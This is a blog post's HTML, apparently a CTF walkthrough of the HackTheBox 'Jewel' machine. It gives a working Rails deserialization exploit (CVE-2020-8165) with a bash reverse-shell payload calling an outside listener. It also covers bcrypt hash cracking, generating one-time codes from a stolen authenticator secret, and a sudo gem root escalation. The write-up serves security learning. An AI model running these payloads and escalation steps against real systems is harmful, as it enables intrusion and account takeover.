@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>Hackthebox Jewel | Razor-Sec</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Hackthebox Jewel | Razor-Sec</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Hackthebox Jewel" />
+<meta name="author" content="Razor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction This is partical room from hackthebox entitled jewel with Medium difficulty. In this room we will learn about code analysis of a Ruby on Rails web application . This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user and in this room using oathtool for google authentication . room link here" />
+<meta property="og:description" content="Introduction This is partical room from hackthebox entitled jewel with Medium difficulty. In this room we will learn about code analysis of a Ruby on Rails web application . This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user and in this room using oathtool for google authentication . room link here" />
+<meta property="og:site_name" content="Razor-Sec" />
+<meta property="og:image" content="/assets/htb_jewel/bg_1.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-15T00:00:00-06:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/assets/htb_jewel/bg_1.png" />
+<meta property="twitter:title" content="Hackthebox Jewel" />
+<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Razor"},"headline":"Hackthebox Jewel","dateModified":"2021-02-15T00:00:00-06:00","description":"Introduction This is partical room from hackthebox entitled jewel with Medium difficulty. In this room we will learn about code analysis of a Ruby on Rails web application . This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user and in this room using oathtool for google authentication . room link here","datePublished":"2021-02-15T00:00:00-06:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup-hackthebox-jewel/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"},"name":"Razor"},"url":"/writeup-hackthebox-jewel/","image":"/assets/htb_jewel/bg_1.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxxxx-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxxxxxxx-1');
+</script>
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/">Home</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/categories">Categories </a></li> 
+        <li><a href="/authors">Users </a></li>     
+        <li><a href="/contact">Contact</a></li>       
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/logo.png" alt="Razor-Sec">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Hackthebox Jewel</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+        </div>            
+        <div>
+        Written by Razor-Admin on 
+        <span class="post-date"><time class="post-date" datetime="2021-02-15">15 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/htb_jewel/bg_1.png" alt="Hackthebox Jewel">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    
+    <div class="toc mt-4 mb-4 lead">
+        <h3 class="font-weight-bold">Summary</h3>
+        <ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#enumeration">Enumeration</a>
+    <ul>
+      <li><a href="#nmap">Nmap</a></li>
+    </ul>
+  </li>
+  <li><a href="#foothold">Foothold</a></li>
+  <li><a href="#privilage-escalation">Privilage Escalation</a></li>
+</ul>
+    </div>
+    
+    <!-- End Toc -->
+    <h2 id="introduction">Introduction</h2>
+<p>This is partical room from hackthebox entitled jewel with Medium difficulty. In this room we will learn about code analysis of a Ruby on Rails web application . This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user and in this room using oathtool for google authentication  . room link <a href="https://tryhackme.com/room/enpass">here</a></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>First time we have to do is scanning the Machine :</p>
+
+<pre><code>$ sudo nmap 10.10.10.211 -sC -sV
+[sudo] password for razor: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 01:19 WIB
+Nmap scan report for 10.10.10.211
+Host is up (0.25s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
+|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
+|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
+8000/tcp open  http    Apache httpd 2.4.38
+|_http-generator: gitweb/2.20.1 git/2.20.1
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-title: 10.10.10.211 Git
+|_Requested resource was http://10.10.10.211:8000/gitweb/
+8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
+|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
+|_http-title: BL0G!
+Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.72 seconds
+</code></pre>
+<p>from the results issued by nmap we get 3 open ports where port 22 is ssh, port 8000 is apache webserver, and port 8080 is nginx. now lets check port 8000 first and look at sumarry</p>
+
+<p><img src="/assets/htb_jewel/bg_2.png" alt="img" /></p>
+
+<p>There is a git repo and we can download snapshot from this repository</p>
+<pre><code>wget '10.10.10.211:8000/gitweb/?p=.git;a=snapshot;h=HEAD;sf=tgz' -O snapshot.tgz
+tar xvzf snapshot.tgz
+
+cd .git-5d6f436 
+</code></pre>
+
+<p><img src="/assets/htb_jewel/bg_3.png" alt="img" /></p>
+
+<p>Let’s take a look at this, Gemfile shows the version of rails which will be released in 2020. After I did some research I found a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165">CVE</a> where we can deserialization vulnerability leading to RCE.</p>
+
+<p>The vulnerability is indicated by the presence of the raw: true option code, which can trigger untrusted string deserialization in marshal. here I am using grep to find vulnerable code :</p>
+
+<p><img src="/assets/htb_jewel/bg_4.png" alt="img" /></p>
+
+<p>here we can see the output of grep where there are 2 vulnerabilities here, such as:</p>
+
+<ul>
+  <li>users_controller.rb
+    <pre><code class="language-bat"> def update
+  @user = User.find(params[:id])
+  if @user &amp;&amp; @user == current_user
+    cache = ActiveSupport::Cache::RedisCacheStore.new(url: "redis://127.0.0.1:6379/0")
+    cache.delete("username_#{session[:user_id]}")
+    @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}
+    if @user.update(user_params)
+      flash[:success] = "Your account was updated successfully"
+      redirect_to articles_path
+    else
+      cache.delete("username_#{session[:user_id]}")
+      render 'edit'
+    end
+  else
+    flash[:danger] = "Not authorized"
+    redirect_to articles_path
+  end
+end
+</code></pre>
+  </li>
+  <li>application_controller.rb
+    <pre><code class="language-bat">def current_username
+  if session[:user_id]
+    cache = ActiveSupport::Cache::RedisCacheStore.new(url: "redis://127.0.0.1:6379/0")
+    @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do
+      @current_user = current_user
+      @current_username = @current_user.username
+    end
+  else
+    @current_username = "guest"
+  end
+  return @current_username
+end
+</code></pre>
+  </li>
+</ul>
+
+<p>This method is an update that is called when the user updates and sets the username_id value without any checking and cleaning. After i did a search here i saw user.rb which contains code like username must be unique between 3 to 25 characters long and contain only alphanumeric characters</p>
+
+<pre><code class="language-bat">class User &lt; ActiveRecord::Base
+ has_many :articles
+ has_secure_password
+ VALID_USER_REGEX = /\A[\w\d]+\z/
+ VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i
+ validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },
+                      format: { with: VALID_USER_REGEX }
+ validates :email, presence: true, length: { maximum: 105 }, uniqueness: { case_sensitive: false }, 
+                   format: { with: VALID_EMAIL_REGEX }
+ before_save { self.email = email.downcase }
+end
+
+</code></pre>
+<p>This logic is very bad, because the serial marshal object is dangerous if set as the username, it is also written to the cache, and fails to update the database. Cached objects must be deleted immediately because no deletion will cause server errors and the operation to be aborted. this will allow the attacker to store arbitrary serial code and will trigger its deserialization which may result in code execution (RCE)</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>Vulnerability is in update profile user, we can register at here http://10.10.10.211:8080/signup. After that, click on profile and you can edit username</p>
+
+<p><img src="/assets/htb_jewel/bg_5.png" alt="img" /></p>
+
+<p>After registration you can also login. Now lets install rails and go to folder then we can build payload based on github</p>
+<pre><code>$ sudo apt install rails
+$ rails new ex
+$ cd ex
+$ rails console 
+</code></pre>
+<p>before we go in console you must set Netcat listener for revershell in another terminal, if you done let’s build some payload :</p>
+<pre><code>&gt; code='`/bin/bash -c "bash -i &amp;&gt;/dev/tcp/10.10.14.54/4444 0&gt;&amp;1"`'
+&gt; erb=ERB.allocate
+&gt; erb.instance_variable_set:@src, code
+&gt; erb.instance_variable_set:@filename, "1"
+&gt; erb.instance_variable_set:@lineno, 1
+&gt; payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb,:result)
+&gt; require'uri'
+&gt; puts URI.encode_www_form(payload:payload)
+</code></pre>
+<p><img src="/assets/htb_jewel/bg_6.png" alt="img" /></p>
+
+<p>Now i have payload :</p>
+<pre><code>payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3E%60%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.54%2F4444+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
+</code></pre>
+<p>Now lets exploit this. in this case i’m using burpsuite to put the payload in username</p>
+
+<p><img src="/assets/htb_jewel/bg_7.png" alt="img" />
+Before update user you must turn on intercept in burpsuite
+<img src="/assets/htb_jewel/bg_8.png" alt="img" />
+change username to payload for revershell and after that you can forward and intercept of then look at your browser
+<img src="/assets/htb_jewel/bg_9.png" alt="img" />
+in this case dont reload the page but just enter on address. then you must be getting a shell
+<img src="/assets/htb_jewel/bg_10.png" alt="img" />
+Now we have user bill</p>
+
+<h2 id="privilage-escalation">Privilage Escalation</h2>
+
+<p>After I went around and did the enumeration of the file system I found this <code>/var/backups/dump_2020-08-27.sql </code> and i found username and hash of password :</p>
+
+<p><img src="/assets/htb_jewel/bg_11.png" alt="img" /></p>
+
+<pre><code>echo '$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW' &gt; pas_hash
+echo '$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO' &gt;&gt; pas_hash
+</code></pre>
+<p>In this case im using <code>hashcat</code> for crack the password :</p>
+
+<p><img src="/assets/htb_jewel/bg_12.png" alt="img" /></p>
+
+<p>and I managed to get one of those two hashes</p>
+<pre><code>$ hashcat -D 2 -m 3200 hashes ~/Documents/Wordlist/rockyou.txt --show                                      130 ⨯
+$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongebob
+</code></pre>
+<p>lets check this :</p>
+<pre><code>bill@jewel:~$ sudo -l
+[sudo] password for bill: 
+Verification code: 
+</code></pre>
+<p>user using google authenticator and as you can see we have folder .google_authenticator
+<img src="/assets/htb_jewel/bg_13.png" alt="img" /></p>
+
+<p>we can use this secret key to generate OTP on our machines</p>
+<pre><code>apt install oathtool
+oathtool -b --totp '2UQI3R52WFCLE6JTLDCSJYMJH4
+</code></pre>
+<p><img src="/assets/htb_jewel/bg.png" alt="img" /></p>
+
+<blockquote>
+  <p>note : your time must be the same as the time in the jewel machine, you can change it by means of timedatectl or date -s</p>
+</blockquote>
+
+<p>The GTFOBins repo provides an example of how this binary can be abused in order to get a root
+shell. <a href="https://gtfobins.github.io/gtfobins/gem/#sudo">Link</a></p>
+
+<p><code>gem open -e "/bin/sh -c /bin/sh" rdoc</code></p>
+
+<p><img src="/assets/htb_jewel/root_flag.png" alt="img" /></p>
+
+<p>Boom!!! We are root now</p>
+
+<p>Happy hacking :D</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
+    <div class="row">
+        <div class="wrapavname col-md-3 text-center">
+            
+            <img  class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+            <p class="mt-4 mb-0 small text-center">
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://www.wowthemes.net/donate/"><i class="fa fa-link"></i></a> 
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/0xRxd"><i class="fab fa-twitter"></i></a>
+                <a class="d-inline-block mx-1 text-dark" href="mailto:markoyanfyan12@gmail.com"><i class="fa fa-envelope"></i></a>
+            </p>
+        </div>
+        <div class="col-md-9">
+            <h4>Razor-Admin</h4>
+            <p class="mt-3 mb-0">Author of Razor-Sec, And i'm learner, Cyber Security Enthusias, DevOps, SysOps</p>
+        </div>
+    </div> 
+</div> 
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments mt-5">
+    <button class="btn btn-outline-dark py-2 px-5 d-block w-100 show-comments"><i class="fa fa-comments text-muted"></i> &nbsp; Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'Demo-RazorSec'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Hackthebox Jewel&url=/writeup-hackthebox-jewel/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/writeup-hackthebox-jewel/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/writeup-hackthebox-jewel/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Hackthebox">Hackthebox</a>                
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Linux">Linux</a>                
+    
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#boot2root">boot2root</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#custom-exploitation">custom exploitation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#cve">cve</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#enumeration">enumeration</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#medium-box">medium-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#privilage-escalation">privilage escalation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#web-exploitation">web exploitation</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-vulnhub-loly/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/vulnhub_loly/bg.png" alt="Loly Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-vulnhub-loly/">Loly Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">02 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-CVE-SUDOERS/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_lunizzctf/bg.png" alt="Tryhackme LunizzCTF (CVE SUDOERS)"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-CVE-SUDOERS/">Tryhackme LunizzCTF (CVE SUDOERS)</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled LunizzCTF with Medium difficulty, but In this Case i want to implement cve sudoers (CVE-2021-3156). In this room we will learn about...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">01 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-vulnhub-pwned1/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/vulnhub_pwned1/bg.png" alt="Pwned1 Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-vulnhub-pwned1/">Pwned1 Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled “Pwned1” form vulnhub. Difficulty of This box is Intermediate and in this box you will learn all about Fuzzing diretory, Custom exploitation,...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">28 Feb 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/logo.png" class="newsletter-logo" alt="Razor-Sec"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group d-inline-flex">
+            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Razor-Sec 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                Created by <a target="_blank" href="">Razor-Sec </a> 
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//Demo-RazorSec.disqus.com/count.js"></script>
+
+
+</body>
+</html>
